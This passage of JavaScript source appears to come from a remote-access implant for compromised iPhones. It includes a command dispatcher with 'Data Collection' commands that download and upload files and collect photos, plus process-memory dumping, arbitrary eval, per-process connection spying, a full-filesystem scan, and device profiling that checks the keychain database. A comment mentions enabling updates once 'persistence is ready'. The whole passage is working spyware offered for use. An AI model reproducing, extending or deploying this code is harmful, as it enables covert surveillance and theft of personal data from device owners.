\" connections\\n\";\n\treturn { code: 0, out: out, err: \"\" };\n}\n\n// ---- Process Network Spy ----\n\nfunction _cmdHttpspy(args) {\n\tvar showAll = false;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-a\") showAll = true;\n\t\telse if (args[i] === \"-h\" || args[i] === \"--help\") {\n\t\t\treturn { code: 0, out:\n\t\t\t\t\"Usage: httpspy [-a]\\n\" +\n\t\t\t\t\"  Maps active network connections to owning processes\\n\" +\n\t\t\t\t\"  Default: show only HTTP (80) / HTTPS (443) connections\\n\" +\n\t\t\t\t\"  -a    Show ALL network connections per process\\n\", err: \"\" };\n\t\t}\n\t}\n\n\tvar pidBufSize = 4 * 8192;\n\tvar pidBuf = Native.callSymbol(\"malloc\", BigInt(pidBufSize));\n\tif (!pidBuf || pidBuf === 0n) return { code: 1, out: \"\", err: \"httpspy: malloc failed\\n\" };\n\n\tvar count = Number(Native.callSymbol(\"proc_listallpids\", pidBuf, pidBufSize));\n\tif (count <= 0) { Native.callSymbol(\"free\", pidBuf); return { code: 1, out: \"\", err: \"httpspy: proc_listallpids failed\\n\" }; }\n\tif (count > 8192) count = 8192;\n\n\tvar pids = [];\n\tfor (var i = 0; i < count; i++) {\n\t\tvar pid = Native.read32(BigInt(pidBuf) + BigInt(i * 4));\n\t\tif (pid > 0) pids.push(pid);\n\t}\n\tNative.callSymbol(\"free\", pidBuf);\n\n\tvar fdInfoSize = 8;\n\tvar fdBuf = Native.callSymbol(\"malloc\", BigInt(fdInfoSize * 2048));\n\tvar sockBuf = Native.callSymbol(\"malloc\", 4096);\n\tvar nameBuf = Native.callSymbol(\"malloc\", 256);\n\tif (!fdBuf || fdBuf === 0n || !sockBuf || sockBuf === 0n || !nameBuf || nameBuf === 0n) {\n\t\tif (fdBuf && fdBuf !== 0n) Native.callSymbol(\"free\", fdBuf);\n\t\tif (sockBuf && sockBuf !== 0n) Native.callSymbol(\"free\", sockBuf);\n\t\tif (nameBuf && nameBuf !== 0n) Native.callSymbol(\"free\", nameBuf);\n\t\treturn { code: 1, out: \"\", err: \"httpspy: malloc failed\\n\" };\n\t}\n\n\tvar OFF_SOI_TYPE     = 176;\n\tvar OFF_SOI_PROTO    = 180;\n\tvar OFF_SOI_FAMILY   = 184;\n\tvar OFF_INI_FPORT    = 264;\n\tvar OFF_INI_LPORT    = 268;\n\tvar OFF_INI_VFLAG    = 288;\n\tvar OFF_INI_FADDR4   = 308;\n\tvar OFF_INI_LADDR4   = 324;\n\tvar OFF_INI_FADDR6   = 296;\n\tvar OFF_INI_LADDR6   = 312;\n\tvar OFF_TCP_STATE    = 360;\n\tvar MIN_SI_SIZE      = 364;\n\n\tvar tcpStates = [\"CLOSED\", \"LISTEN\", \"SYN_SENT\", \"SYN_RCVD\", \"ESTABLISHED\",\n\t\t\"CLOSE_WAIT\", \"FIN_WAIT_1\", \"CLOSING\", \"LAST_ACK\", \"FIN_WAIT_2\", \"TIME_WAIT\"];\n\tvar results = [];\n\n\tfor (var pi = 0; pi < pids.length; pi++) {\n\t\tvar pid = pids[pi];\n\t\tvar fdBytes = Number(Native.callSymbol(\"proc_pidinfo\", pid, 1, 0, fdBuf, fdInfoSize * 2048));\n\t\tif (fdBytes <= 0) continue;\n\t\tvar fdCount = Math.floor(fdBytes / fdInfoSize);\n\t\tvar procName = null;\n\n\t\tfor (var fi = 0; fi < fdCount && fi < 2048; fi++) {\n\t\t\ttry {\n\t\t\t\tvar fd = _readU32(fdBuf, fi * 8);\n\t\t\t\tvar fdtype = _readU32(fdBuf, fi * 8 + 4);\n\t\t\t\tif (fdtype !== 2) continue;\n\n\t\t\t\tNative.callSymbol(\"memset\", sockBuf, 0, 4096);\n\t\t\t\tvar infoBytes = Number(Native.callSymbol(\"proc_pidfdinfo\", pid, fd, 3, sockBuf, 4096));\n\t\t\t\tif (infoBytes < MIN_SI_SIZE) continue;\n\n\t\t\t\tvar family = _readU32(sockBuf, OFF_SOI_FAMILY);\n\t\t\t\tvar protocol = _readU32(sockBuf, OFF_SOI_PROTO);\n\t\t\t\tif (family !== 2 && family !== 30) continue;\n\t\t\t\tif (protocol !== 6 && protocol !== 17) continue;\n\n\t\t\t\tvar fport = (_readU8(sockBuf, OFF_INI_FPORT) << 8) | _readU8(sockBuf, OFF_INI_FPORT + 1);\n\t\t\t\tvar lport = (_readU8(sockBuf, OFF_INI_LPORT) << 8) | _readU8(sockBuf, OFF_INI_LPORT + 1);\n\n\t\t\t\tif (!showAll && fport !== 80 && fport !== 443 && lport !== 80 && lport !== 443) continue;\n\n\t\t\t\tvar vflag = _readU8(sockBuf, OFF_INI_VFLAG);\n\t\t\t\tvar faddrStr = \"*\", laddrStr = \"*\";\n\n\t\t\t\tif (vflag & 1) {\n\t\t\t\t\tvar fa = new Uint8Array(Native.read(sockBuf + BigInt(OFF_INI_FADDR4), 4));\n\t\t\t\t\tvar la = new Uint8Array(Native.read(sockBuf + BigInt(OFF_INI_LADDR4), 4));\n\t\t\t\t\tfaddrStr = fa[0] + \".\" + fa[1] + \".\" + fa[2] + \".\" + fa[3];\n\t\t\t\t\tladdrStr = la[0] + \".\" + la[1] + \".\" + la[2] + \".\" + la[3];\n\t\t\t\t} else if (vflag & 2) {\n\t\t\t\t\tvar fa6 = new Uint8Array(Native.read(sockBuf + BigInt(OFF_INI_FADDR6), 16));\n\t\t\t\t\tvar la6 = new Uint8Array(Native.read(sockBuf + BigInt(OFF_INI_LADDR6), 16));\n\t\t\t\t\tfaddrStr = _fmtIPv6Short(fa6, 0);\n\t\t\t\t\tladdrStr = _fmtIPv6Short(la6, 0);\n\t\t\t\t}\n\n\t\t\t\tvar stateStr = \"\";\n\t\t\t\tif (protocol === 6 && infoBytes > OFF_TCP_STATE + 4) {\n\t\t\t\t\tvar st = _readU32(sockBuf, OFF_TCP_STATE);\n\t\t\t\t\tstateStr = (st < tcpStates.length) ? tcpStates[st] : \"?\" + st;\n\t\t\t\t}\n\n\t\t\t\tif (procName === null) {\n\t\t\t\t\tNative.callSymbol(\"memset\", nameBuf, 0, 256);\n\t\t\t\t\tvar nl = Number(Native.callSymbol(\"proc_name\", pid, nameBuf, 255));\n\t\t\t\t\tprocName = nl > 0 ? Native.readString(BigInt(nameBuf), 255) : \"?\";\n\t\t\t\t}\n\n\t\t\t\tresults.push({ pid: pid, name: procName,\n\t\t\t\t\tproto: (protocol === 6 ? \"tcp\" : \"udp\") + (family === 30 ? \"6\" : \"4\"),\n\t\t\t\t\tladdr: laddrStr, lport: lport, faddr: faddrStr, fport: fport, state: stateStr });\n\t\t\t} catch (fdErr) { /* skip on error */ }\n\t\t}\n\t}\n\n\tNative.callSymbol(\"free\", fdBuf);\n\tNative.callSymbol(\"free\", sockBuf);\n\tNative.callSymbol(\"free\", nameBuf);\n\n\tvar out = \"PID    Process              Proto  Local                  Remote                       State\\n\";\n\tout += \"-----  -------------------  -----  ---------------------  ---------------------------  -----------\\n\";\n\tfor (var ri = 0; ri < results.length; ri++) {\n\t\tvar r = results[ri];\n\t\tvar ps = \"\" + r.pid; while (ps.length < 6) ps += \" \";\n\t\tvar ns = r.name; while (ns.length < 21) ns += \" \";\n\t\tvar ts = r.proto; while (ts.length < 7) ts += \" \";\n\t\tvar ls = r.laddr + \":\" + r.lport; while (ls.length < 23) ls += \" \";\n\t\tvar rs = r.faddr + \":\" + r.fport; while (rs.length < 29) rs += \" \";\n\t\tout += ps + ns + ts + ls + rs + r.state + \"\\n\";\n\t}\n\tout += \"\\nTotal: \" + results.length + \" connections\";\n\tif (!showAll) out += \" (HTTP/HTTPS only, use -a for all)\";\n\tout += \"\\n\";\n\treturn { code: 0, out: out, err: \"\" };\n}\n\n// ---- Special Commands (delegate to existing handlers) ----\n\nfunction _cmdDownload(args, cmd) {\n\tif (args.length < 2) {\n\t\tsendJSON(cmd.command_id, { exit_code: 1, stdout: \"\", stderr: _strToB64(\"download: missing path\\n\"),\n\t\t\texecution_time: 0, timeout: false, _task_id: (cmd.params||{})._task_id||\"\", _task_type: (cmd.params||{})._task_type||\"\" }, \"exec_result.json\");\n\t\treturn null;\n\t}\n\tvar path = _resolvePath(args[1]);\n\tvar maxSz = args.length > 2 ? parseInt(args[2]) : MAX_FILE_SIZE;\n\thandleDownload({ command_id: cmd.command_id, params: { path: path, max_size: maxSz || MAX_FILE_SIZE,\n\t\t_task_id: (cmd.params||{})._task_id||\"\", _task_type: (cmd.params||{})._task_type||\"\" } });\n\treturn null;\n}\n\nfunction _cmdPhotos(args, cmd) {\n\tvar maxCount = args.length > 1 ? parseInt(args[1]) : 50;\n\thandlePhotos({ command_id: cmd.command_id, params: { max_count: maxCount || 50,\n\t\t_task_id: (cmd.params||{})._task_id||\"\", _task_type: (cmd.params||{})._task_type||\"\" } });\n\treturn null;\n}\n\nfunction _cmdApps() {\n\tvar base = \"/var/mobile/Containers/Data/Application\";\n\tvar dirs = listDir(base);\n\tvar out = \"\", count = 0;\n\tfor (var i = 0; i < dirs.length; i++) {\n\t\tif (dirs[i].type !== \"dir\") continue;\n\t\tvar meta = base + \"/\" + dirs[i].name + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\tvar hasMeta = Number(Native.callSymbol(\"access\", meta, 0)) === 0;\n\t\tout += dirs[i].name + \"\\t\" + (hasMeta ? \"metadata\" : \"no-metadata\") + \"\\n\";\n\t\tcount++;\n\t}\n\tout += \"\\nTotal: \" + count + \" applications\\n\";\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdUpload(args, cmd) {\n\tvar paths = [];\n\tfor (var i = 1; i < args.length; i++) paths.push(_resolvePath(args[i]));\n\tif (!paths.length) paths.push(\"/var/mobile\");\n\thandleFileUpload({ command_id: cmd.command_id, params: { upload_paths: paths,\n\t\t_task_id: (cmd.params||{})._task_id||\"\", _task_type: (cmd.params||{})._task_type||\"\" } });\n\treturn null;\n}\n\nfunction _cmdEvalCode(args) {\n\tvar code = args.slice(1).join(\" \");\n\tif (!code) return { code: 1, out: \"\", err: \"eval: empty code\\n\" };\n\ttry {\n\t\tvar r = eval(code);\n\t\treturn { code: 0, out: String(r !== undefined ? r : \"\") + \"\\n\", err: \"\" };\n\t} catch (e) {\n\t\treturn { code: 1, out: \"\", err: String(e) + \"\\n\" };\n\t}\n}\n\nfunction _cmdHelp() {\n\tvar out = \"Available commands:\\n\";\n\tout += \"  File System:\\n\";\n\tout += \"    ls [-l] [-a] [path]          List directory contents\\n\";\n\tout += \"    cat <file> [file2...]         Display file content\\n\";\n\tout += \"    pwd                           Print working directory\\n\";\n\tout += \"    cd [path]                     Change directory\\n\";\n\tout += \"    mkdir [-p] <path>             Create directory\\n\";\n\tout += \"    rm [-rf] <path>               Remove file or directory\\n\";\n\tout += \"    cp <src> <dst>                Copy file\\n\";\n\tout += \"    mv <src> <dst>                Move/rename\\n\";\n\tout += \"    stat <path>                   File info\\n\";\n\tout += \"    chmod <mode> <path>           Change permissions (octal)\\n\";\n\tout += \"    touch <path>                  Create / update timestamp\\n\";\n\tout += \"    ln [-s] <target> <link>       Create link\\n\";\n\tout += \"    readlink <path>               Read symlink target\\n\";\n\tout += \"    find <path> [-name p] [-type f|d]  Search files\\n\";\n\tout += \"    head [-n N] <file>            Show first N lines\\n\";\n\tout += \"    tail [-n N] <file>            Show last N lines\\n\";\n\tout += \"    wc [-lwc] <file>              Count lines/words/chars\\n\";\n\tout += \"    grep [-in] <pattern> <file>   Search in file\\n\";\n\tout += \"    du [-sh] <path>               Disk usage\\n\";\n\tout += \"    file <path>                   Detect file type\\n\";\n\tout += \"    hexdump [-n N] <file>         Hex dump\\n\";\n\tout += \"  System Info:\\n\";\n\tout += \"    whoami                        Current user\\n\";\n\tout += \"    id                            User/group IDs\\n\";\n\tout += \"    uname [-a]                    System information\\n\";\n\tout += \"    hostname                      Device hostname\\n\";\n\tout += \"    df [-h]                       Disk space\\n\";\n\tout += \"    date                          Current date/time\\n\";\n\tout += \"    echo <text>                   Echo text\\n\";\n\tout += \"  Process:\\n\";\n\tout += \"    ps                            List all running processes\\n\";\n\tout += \"    memdump <pid> <addr> <size>   Dump process memory (hex addr, max 1MB)\\n\";\n\tout += \"  Network:\\n\";\n\tout += \"    ifconfig                      Show network interfaces & IP addresses\\n\";\n\tout += \"    netstats                      Network traffic statistics per interface\\n\";\n\tout += \"    connections [-t] [-u] [-a] [-l]  List active TCP/UDP connections\\n\";\n\tout += \"    httpspy [-a]                     Map connections to processes (HTTP/HTTPS)\\n\";\n\tout += \"  Data Collection:\\n\";\n\tout += \"    download <path> [max_size]    Download file from device\\n\";\n\tout += \"    photos [max_count]            Collect photos\\n\";\n\tout += \"    apps                          List installed apps\\n\";\n\tout += \"    upload <paths...>             Upload files\\n\";\n\tout += \"  Advanced:\\n\";\n\tout += \"    eval <code>                   Execute JavaScript code\\n\";\n\tout += \"    help                          Show this help\\n\";\n\treturn { code: 0, out: out, err: \"\" };\n}\n\n// ---- Dispatcher ----\n\nfunction handleExecuteCommand(cmd) {\n\tvar p = cmd.params || {};\n\tvar commandStr = p.command || \"\";\n\tvar timeoutSec = p.timeout || 30;\n\tvar workDir = p.working_directory;\n\tvar startMs = Date.now();\n\n\tif (workDir) _cwd = workDir;\n\n\tif (!commandStr) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\texit_code: 1, stdout: \"\", stderr: _strToB64(\"error: empty command\\n\"),\n\t\t\texecution_time: 0, timeout: false,\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"exec_result.json\");\n\t\treturn;\n\t}\n\n\tvar args = _parseArgs(commandStr);\n\tif (!args.length) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\texit_code: 1, stdout: \"\", stderr: _strToB64(\"error: empty command\\n\"),\n\t\t\texecution_time: 0, timeout: false,\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"exec_result.json\");\n\t\treturn;\n\t}\n\n\tvar cmdName = args[0].toLowerCase();\n\tvar result = null;\n\n\ttry {\n\t\tswitch (cmdName) {\n\t\t\tcase \"ls\": case \"dir\":      result = _cmdLs(args); break;\n\t\t\tcase \"cat\": case \"type\":    result = _cmdCat(args); break;\n\t\t\tcase \"pwd\":                 result = _cmdPwd(); break;\n\t\t\tcase \"cd\":                  result = _cmdCd(args); break;\n\t\t\tcase \"mkdir\": case \"md\":    result = _cmdMkdir(args); break;\n\t\t\tcase \"rm\": case \"del\":      result = _cmdRm(args); break;\n\t\t\tcase \"cp\": case \"copy\":     result = _cmdCp(args); break;\n\t\t\tcase \"mv\": case \"move\": case \"ren\": result = _cmdMv(args); break;\n\t\t\tcase \"stat\":                result = _cmdStat(args); break;\n\t\t\tcase \"chmod\":               result = _cmdChmod(args); break;\n\t\t\tcase \"touch\":               result = _cmdTouch(args); break;\n\t\t\tcase \"ln\":                  result = _cmdLn(args); break;\n\t\t\tcase \"readlink\":            result = _cmdReadlink(args); break;\n\t\t\tcase \"find\":                result = _cmdFind(args); break;\n\t\t\tcase \"head\":                result = _cmdHead(args); break;\n\t\t\tcase \"tail\":                result = _cmdTail(args); break;\n\t\t\tcase \"wc\":                  result = _cmdWc(args); break;\n\t\t\tcase \"grep\":                result = _cmdGrep(args); break;\n\t\t\tcase \"du\":                  result = _cmdDu(args); break;\n\t\t\tcase \"file\":                result = _cmdFile(args); break;\n\t\t\tcase \"hexdump\":             result = _cmdHexdump(args); break;\n\t\t\tcase \"whoami\":              result = _cmdWhoami(); break;\n\t\t\tcase \"id\":                  result = _cmdId(); break;\n\t\t\tcase \"uname\":               result = _cmdUname(args); break;\n\t\t\tcase \"hostname\":            result = _cmdHostname(); break;\n\t\t\tcase \"df\":                  result = _cmdDf(args); break;\n\t\t\tcase \"date\":                result = _cmdDate(); break;\n\t\t\tcase \"echo\":                result = _cmdEcho(args); break;\n\t\t\tcase \"ps\":                  result = _cmdPs(args); break;\n\t\t\tcase \"memdump\":             result = _cmdMemdump(args); break;\n\t\t\tcase \"ifconfig\": case \"ipconfig\": result = _cmdIfconfig(args); break;\n\t\t\tcase \"netstats\": case \"netstat\":  result = _cmdNetstats(args); break;\n\t\t\tcase \"connections\": case \"conn\":   result = _cmdConnections(args); break;\n\t\t\tcase \"httpspy\": case \"spy\":       result = _cmdHttpspy(args); break;\n\t\t\tcase \"download\":            result = _cmdDownload(args, cmd); break;\n\t\t\tcase \"photos\":              result = _cmdPhotos(args, cmd); break;\n\t\t\tcase \"apps\":                result = _cmdApps(); break;\n\t\t\tcase \"upload\": case \"file_upload\": result = _cmdUpload(args, cmd); break;\n\t\t\tcase \"eval\": case \"exec\": case \"js\": result = _cmdEvalCode(args); break;\n\t\t\tcase \"help\": case \"?\":      result = _cmdHelp(); break;\n\t\t\tdefault:\n\t\t\t\tresult = { code: 127, out: \"\", err: cmdName + \": command not found. Type 'help' for available commands.\\n\" };\n\t\t}\n\t} catch (e) {\n\t\tresult = { code: 1, out: \"\", err: \"error: \" + String(e) + \"\\n\" };\n\t}\n\n\tif (result === null) return;\n\n\tvar endMs = Date.now();\n\tvar execTime = (endMs - startMs) / 1000;\n\n\tsendJSON(cmd.command_id, {\n\t\texit_code: result.code,\n\t\tstdout: _strToB64(result.out),\n\t\tstderr: _strToB64(result.err),\n\t\texecution_time: execTime,\n\t\ttimeout: execTime >= timeoutSec,\n\t\t_task_id: p._task_id || \"\",\n\t\t_task_type: p._task_type || \"\"\n\t}, \"exec_result.json\");\n}\n\nfunction handleBasicInfo(cmd) {\n\tvar info = {\n\t\tuuid: DEVICE_UUID,\n\t\tmachine: DEVICE_MODEL,\n\t\t_task_id: (cmd.params && cmd.params._task_id) || \"\",\n\t\t_task_type: (cmd.params && cmd.params._task_type) || \"\",\n\t\tcollect_time: Date.now(),\n\t\tos_type: \"iOS\"\n\t};\n\n\t// 1. Kernel / system info via uname\n\ttry {\n\t\tvar uts = Native.callSymbol(\"calloc\", 1, 1536);\n\t\tif (uts && uts !== 0n) {\n\t\t\tNative.callSymbol(\"uname\", uts);\n\t\t\tinfo.sysname  = Native.readString(uts, 256).replace(/\\0/g, \"\");\n\t\t\tinfo.nodename = Native.readString(uts + 256n, 256).replace(/\\0/g, \"\");\n\t\t\tinfo.release  = Native.readString(uts + 512n, 256).replace(/\\0/g, \"\");\n\t\t\tinfo.version  = Native.readString(uts + 768n, 256).replace(/\\0/g, \"\");\n\t\t\tinfo.machine_arch = Native.readString(uts + 1024n, 256).replace(/\\0/g, \"\");\n\t\t\tNative.callSymbol(\"free\", uts);\n\t\t}\n\t} catch(e) { info._err_uname = String(e); }\n\n\t// 2. Disk space via statfs(\"/\")\n\t//    struct statfs arm64: f_bsize(u32,0) f_iosize(i32,4) f_blocks(u64,8)\n\t//                         f_bfree(u64,16) f_bavail(u64,24)\n\ttry {\n\t\tvar sbuf = Native.callSymbol(\"calloc\", 1, 4096);\n\t\tif (sbuf && sbuf !== 0n) {\n\t\t\tvar sr = Number(Native.callSymbol(\"statfs\", \"/\", sbuf));\n\t\t\tif (sr === 0) {\n\t\t\t\tvar bsRaw = new DataView(Native.read(BigInt(sbuf), 4));\n\t\t\t\tvar bsize  = bsRaw.getUint32(0, true);\n\t\t\t\tvar blocks = Number(Native.readPtr(BigInt(sbuf) + 8n));\n\t\t\t\tvar bfree  = Number(Native.readPtr(BigInt(sbuf) + 16n));\n\t\t\t\tvar bavail = Number(Native.readPtr(BigInt(sbuf) + 24n));\n\t\t\t\tinfo.disk_block_size  = bsize;\n\t\t\t\tinfo.disk_total_bytes = blocks * bsize;\n\t\t\t\tinfo.disk_free_bytes  = bfree * bsize;\n\t\t\t\tinfo.disk_avail_bytes = bavail * bsize;\n\t\t\t\tinfo.disk_total_gb = Math.round(blocks * bsize / 1073741824 * 10) / 10;\n\t\t\t\tinfo.disk_free_gb  = Math.round(bfree * bsize / 1073741824 * 10) / 10;\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", sbuf);\n\t\t}\n\t} catch(e) { info._err_statfs = String(e); }\n\n\t// 3. Process identity\n\ttry {\n\t\tinfo.pid = Number(Native.callSymbol(\"getpid\"));\n\t\tinfo.uid = Number(Native.callSymbol(\"getuid\"));\n\t\tinfo.gid = Number(Native.callSymbol(\"getgid\"));\n\t} catch(e) {}\n\n\t// 4. Hostname via gethostname\n\ttry {\n\t\tvar hbuf = Native.callSymbol(\"malloc\", 256);\n\t\tif (hbuf && hbuf !== 0n) {\n\t\t\tvar hr = Number(Native.callSymbol(\"gethostname\", hbuf, 255));\n\t\t\tif (hr === 0) info.hostname = Native.readString(hbuf, 256).replace(/\\0/g, \"\");\n\t\t\tNative.callSymbol(\"free\", hbuf);\n\t\t}\n\t} catch(e) {}\n\n\t// 5. Installed apps summary\n\ttry {\n\t\tvar appBase = \"/var/mobile/Containers/Data/Application\";\n\t\tvar appDirs = listDir(appBase);\n\t\tvar appCount = 0;\n\t\tfor (var ai = 0; ai < appDirs.length; ai++) {\n\t\t\tif (appDirs[ai].type === \"dir\") appCount++;\n\t\t}\n\t\tinfo.installed_app_count = appCount;\n\t} catch(e) {}\n\n\t// 6. WiFi passwords file status\n\ttry {\n\t\tvar wfSize = getFileSize(\"/var/Keychains/keychain-2.db\");\n\t\tinfo.keychain_db_size = wfSize > 0 ? wfSize : 0;\n\t} catch(e) {}\n\n\tvar endMs = Date.now();\n\tsendJSON(cmd.command_id, info, \"basic_info.json\",\n\t\t{ start_ms: info.collect_time, end_ms: endMs });\n}\n\n// handleUpdate: disabled for now, will be enabled after persistence is ready\n// function handleUpdate(cmd) { ... }\n\n// ============================================================================\n// disk_scan: recursive filesystem traversal with stat metadata (TXT format)\n// ============================================================================\n\nvar SCAN_WRITE_BUF = 65536;\nvar SCAN_MAX_DEPTH = 20;\nvar SCAN_MAX_ITEMS = 300000;\nvar SCAN_YIELD_EVERY = 2000;\nvar SCAN_SKIP_DIRS = [\n\t\"/dev\", \"/cores\",\n\t\"/System/Library/Caches/com.apple.kernelcaches\",\n\t\"/System/Library/Caches/com.apple.dyld\",\n\t\"/System/Library/PrivateFrameworks\",\n\t\"/System/Library/Frameworks\",\n\t\"/System/Library/Extensions\",\n\t\"/System/Library/CoreServices\",\n\t\"/System/Library/PreferenceBundles\",\n\t\"/System/iOSSupport\",\n\t\"/usr/lib\", \"/usr/libexec\", \"/usr/sbin\", \"/usr/bin\", \"/usr/share\",\n\t\"/usr/standalone\",\n\t\"/private/var/db/dyld_shared_cache_arm64e\",\n\t\"/private/var/hardware\",\n\t\"/private/var/log/asl\",\n\t\"/private/preboot\",\n\t\"/Library/Ringtones\",\n\t\"/Library/Wallpaper\"\n];\n\nfunction _readU16(ptr, off) {\n\tvar b = new Uint8Array(Native.read(ptr + BigInt(off), 2));\n\treturn b[0] | (b[1] << 8);\n}\nfunction _readI64(ptr, off) {\n\tvar b = new Uint8Array(Native.read(ptr + BigInt(off), 8));\n\tvar lo = (b[0] | (b[1] << 8) | (b[2] << 16) | ((b[3] << 24) >>> 0)) >>> 0;\n\tvar hi = (b[4] | (b[5] << 8) | (b[6] << 16) | ((b[7] << 24) >>> 0)) >>> 0;\n\treturn hi * 4294967296 + lo;\n}\nfunction _readU8(ptr, off) {\n\treturn new Uint8Array(Native.read(ptr + BigInt(off), 1))[0];\n}\nfunction _readU32(ptr, off) {\n\tvar b = new Uint8Array(Native.read(ptr + BigInt(off), 4));\n\treturn (b[0] | (b[1] << 8) | (b[2] << 16) | ((b[3] << 24) >>> 0)) >>> 0;\n}\n\nfunction _writeAll(fd, bufSize, ptr, data) {\n\tvar bytes = new Uint8Array(Native.stringToBytes(data, false));\n\tvar pos = 0;\n\twhile (pos < bytes.length) {\n\t\tvar chunk = Math.min(bytes.length - pos, bufSize);\n\t\tvar ab = new ArrayBuffer(chunk);\n\t\tnew Uint8Array(ab).set(bytes.subarray(pos, pos + chunk));\n\t\tNative.write(ptr, ab);\n\t\tvar nw = Number(Native.callSymbol(\"write\", fd, ptr, chunk));\n\t\tif (nw <= 0) return false;\n\t\tpos += nw;\n\t}\n\treturn true;\n}\n\nfunction _sanitizePath(p) {\n\tvar s = \"\";\n\tfor (var i = 0; i < p.length; i++) {\n\t\tvar c = p.charCodeAt(i);\n\t\tif (c === 0x7C) s += \"_\";\n\t\telse if (c === 0x0A || c === 0x0D) s += \" \";\n\t\telse s += p.charAt(i);\n\t}\n\treturn s;\n}\n\nfunction handleDiskScan(cmd) {\n\tvar p = cmd.params || {};\n\tvar startMs = Date.now();\n\tvar startISO = new Date(startMs).toISOString().replace(\"T\",\" \").replace(\"Z\",\"\");\n\n\tvar tmpCandidates = [\n\t\t\"/var/mobile/Library/Caches/ios_disk_scan.txt\",\n\t\t\"/var/mobile/ios_disk_scan.txt\",\n\t\t\"/tmp/ios_disk_scan.txt\"\n\t];\n\tvar tmpPath = \"\";\n\tvar fd = -1;\n\tfor (var ti = 0; ti < tmpCandidates.length; ti++) {\n\t\tfd = Number(Native.callSymbol(\"open\", tmpCandidates[ti], 0x0602, 0x1a4));\n\t\tif (fd >= 0) { tmpPath = tmpCandidates[ti]; break; }\n\t}\n\tif (fd < 0) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\", error: \"cannot create temp file (tried \" + tmpCandidates.join(\", \") + \")\",\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"disk_scan_result.json\");\n\t\treturn;\n\t}\n\n\tvar wBuf = Native.callSymbol(\"malloc\", BigInt(SCAN_WRITE_BUF));\n\tvar statBuf = Native.callSymbol(\"malloc\", 144n);\n\tif (!wBuf || wBuf === 0n || !statBuf || statBuf === 0n) {\n\t\tNative.callSymbol(\"close\", fd);\n\t\tif (wBuf && wBuf !== 0n) Native.callSymbol(\"free\", BigInt(wBuf));\n\t\tif (statBuf && statBuf !== 0n) Native.callSymbol(\"free\", BigInt(statBuf));\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\", error: \"malloc failed\",\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"disk_scan_result.json\");\n\t\treturn;\n\t}\n\n\tvar pending = \"\";\n\tvar FLUSH_AT = 32768;\n\tvar totalFiles = 0, totalDirs = 0, totalLinks = 0, totalSize = 0;\n\tvar itemCount = 0;\n\tvar hitLimit = false;\n\tvar writeErrors = 0;\n\n\tfunction flush() {\n\t\tif (pending.length > 0) {\n\t\t\tif (!_writeAll(fd, SCAN_WRITE_BUF, wBuf, pending)) writeErrors++;\n\t\t\tpending = \"\";\n\t\t}\n\t}\n\tfunction emit(line) {\n\t\tpending += line + \"\\n\";\n\t\tif (pending.length >= FLUSH_AT) flush();\n\t}\n\n\ttry {\n\t\temit(\"# =====================================\");\n\t\temit(\"# Directory Scan Result\");\n\t\temit(\"# =====================================\");\n\t\temit(\"# Scan directory: /\");\n\t\temit(\"# Start time: \" + startISO);\n\t\temit(\"# Start timestamp: \" + startMs);\n\t\temit(\"# =====================================\");\n\t\temit(\"# Format (separator: |)\");\n\t\temit(\"# Col1: Full path\");\n\t\temit(\"# Col2: Type (FILE=file DIR=directory LNK=symlink)\");\n\t\temit(\"# Col3: Attributes (D=directory A=archive R=readonly H=hidden L=symlink)\");\n\t\temit(\"# Col4: Created time (ms timestamp)\");\n\t\temit(\"# Col5: Modified time (ms timestamp)\");\n\t\temit(\"# Col6: Accessed time (ms timestamp)\");\n\t\temit(\"# Col7: Size (bytes, 0 for dirs)\");\n\t\temit(\"# =====================================\");\n\n\t\tvar stack = [\"/\", 0];\n\t\tvar stackLen = 2;\n\n\t\twhile (stackLen > 0) {\n\t\t\tif (itemCount >= SCAN_MAX_ITEMS) { hitLimit = true; break; }\n\n\t\t\tvar depth = stack[stackLen - 1];\n\t\t\tvar dirPath = stack[stackLen - 2];\n\t\t\tstackLen -= 2;\n\n\t\t\tif (depth > SCAN_MAX_DEPTH) continue;\n\n\t\t\tvar skip = false;\n\t\t\tfor (var si = 0; si < SCAN_SKIP_DIRS.length; si++) {\n\t\t\t\tif (dirPath === SCAN_SKIP_DIRS[si] ||\n\t\t\t\t\tdirPath.indexOf(SCAN_SKIP_DIRS[si] + \"/\") === 0) {\n\t\t\t\t\tskip = true; break;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (skip) continue;\n\n\t\t\tvar dh = Native.callSymbol(\"opendir\", dirPath);\n\t\t\tif (!dh || dh === 0n) continue;\n\n\t\t\ttry {\n\t\t\t\tfor (;;) {\n\t\t\t\t\tif (itemCount >= SCAN_MAX_ITEMS) { hitLimit = true; break; }\n\n\t\t\t\t\tvar ent = Native.callSymbol(\"readdir\", BigInt(dh));\n\t\t\t\t\tif (!ent || ent === 0n) break;\n\n\t\t\t\t\ttry {\n\t\t\t\t\t\tvar dtype = new Uint8Array(Native.read(BigInt(ent) + 20n, 1))[0];\n\t\t\t\t\t\tvar name = Native.readString(BigInt(ent) + 21n, 256);\n\t\t\t\t\t\tif (name === \".\" || name === \"..\") continue;\n\n\t\t\t\t\t\tvar fullPath = dirPath === \"/\" ? \"/\" + name : dirPath + \"/\" + name;\n\t\t\t\t\t\tvar ret = Number(Native.callSymbol(\"lstat\", fullPath, BigInt(statBuf)));\n\n\t\t\t\t\t\tvar ftype = \"FILE\", attrs = \"-A----\", fsize = 0;\n\t\t\t\t\t\tvar ctime = 0, mtime = 0, atime = 0;\n\n\t\t\t\t\t\tif (ret === 0) {\n\t\t\t\t\t\t\tvar mode = _readU16(BigInt(statBuf), 4);\n\t\t\t\t\t\t\tvar fmt = mode & 0xF000;\n\t\t\t\t\t\t\tif (fmt === 0x4000) {\n\t\t\t\t\t\t\t\tftype = \"DIR\"; attrs = \"D-----\"; 